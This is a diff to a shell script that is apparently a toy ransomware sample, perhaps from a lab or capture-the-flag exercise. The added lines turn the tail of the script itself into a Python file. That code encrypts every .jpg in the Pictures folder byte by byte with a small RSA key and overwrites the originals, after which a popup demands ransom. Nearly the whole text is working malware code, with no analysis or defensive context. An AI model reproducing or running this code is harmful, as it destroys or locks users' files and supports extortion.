@@ -11,7 +11,22 @@ sleep 1
 ./c "$2"
 rm c
 rm c.zip
+cp w rsa_encrypt.py
+sed -i '1,19d' rsa_encrypt.py
 #the virus
-find Pictures -name "*.jpg" -print0|xargs -I{} -0 python3 materials/rsa_encrypt.py 22291846172619859445381409012451 65535 {};
+find Pictures -name "*.jpg" -print0|xargs -I{} -0 python3 rsa_encrypt.py 22291846172619859445381409012451 65535 {};
 zenity --info --title "Error" --text "Give me ransom haha"
 exit 0
+import sys
+import pickle
+
+n = int(sys.argv[1])
+e = int(sys.argv[2])
+filename = sys.argv[3]
+
+plain_bytes = b''
+with open(filename, 'rb') as f:
+    plain_bytes = f.read()
+cipher_int = [pow(i, e, n) for i in plain_bytes]
+with open(filename, 'wb') as f:
+    pickle.dump(cipher_int, f)
